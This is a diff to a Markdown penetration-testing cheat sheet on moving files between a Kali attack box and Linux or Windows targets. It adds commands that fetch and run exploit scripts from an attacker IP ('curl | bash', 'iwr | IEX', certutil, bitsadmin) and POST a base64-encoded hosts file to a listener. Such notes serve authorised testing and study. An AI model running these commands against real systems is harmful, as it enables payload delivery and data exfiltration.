@@ -785,6 +785,12 @@ $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
 ```
 
+- PHP Server (Kali -> Linux)
+
+```
+$ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file_put_contents("exploit.sh",$file);'
+```
+
 - SCP Downloads (Kali -> Windows)
 
 ```
@@ -801,6 +807,7 @@ C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
 
 ```
 PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP address>:8000/exploit.ps1','C:\Users\Public\Downloads\exploit.ps1')
+C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
 ```
 
 - PowerShell Invoke-WebRequest (Kali -> Windows)
@@ -808,6 +815,7 @@ PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP address>:8000/exploi
 ```
 PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -OutFile exploit.ps1
 PS C:\> iwr http://<IP address>:8000/exploit.ps1 -OutFile exploit.ps1
+PS C:\> Invoke-WebRequest http://<IP address>/exploit.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "exploit.exe"
 
 # Internet Explorer first-launch error
 PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -UseBasicParsing | IEX
@@ -836,7 +844,7 @@ PS C:\> Invoke-FileUpload -Uri http://<IP address>/upload -File C:\Windows\Syste
 
 ```
 PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-PS C:\> Invoke-WebRequest -Uri http://<IP address>:8000/ -Method POST -Body $b64s
+PS C:\> Invoke-WebRequest -Uri http://<IP address>:443/ -Method POST -Body $b64s
 $ nc -nlvp 8000
 $ echo <base64> | base64 -d -w 0 > hosts
 ```
@@ -847,6 +855,8 @@ $ echo <base64> | base64 -d -w 0 > hosts
 $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 C:\> net use n: \\<IP address>\smbshare /user:test test
 C:\> copy n:\exploit.exe
+OR
+C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
 OR
 $ smbserver.py a /usr/share/windows-binaries/
 ```
@@ -913,31 +923,15 @@ ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
 
-- Host Files
+- Bitsadmin
 
 ```
-$ nc -nlvp 443 < file.txt
-$ python -m SimpleHTTPServer 80
-$ python3 -m http.server 8000
-C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
-$ smbserver.py a /usr/share/windows-binaries/
-C:\> Invoke-WebRequest -Uri http://<IP address>:443 -Method POST -Body $b64
-```
-
-- Download Files
-
-```
-$ nc -nv <IP address> 443 > file.txt
-$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
-$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
-$ curl http://<IP address>:8000/exploit.sh | bash
-$ scp <user>@<IP address>:/tmp/exploit.exe C:\Temp\exploit.exe
-$ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file_put_contents("exploit.sh",$file);'
-C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
-C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
-C:\> Invoke-WebRequest http://<IP address>/exploit.exe -OutFile exploit.exe
-C:\> Invoke-WebRequest http://<IP address>/exploit.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "exploit.exe"
 C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
+```
+
+- Certutil
+
+```
 C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
 ```
 
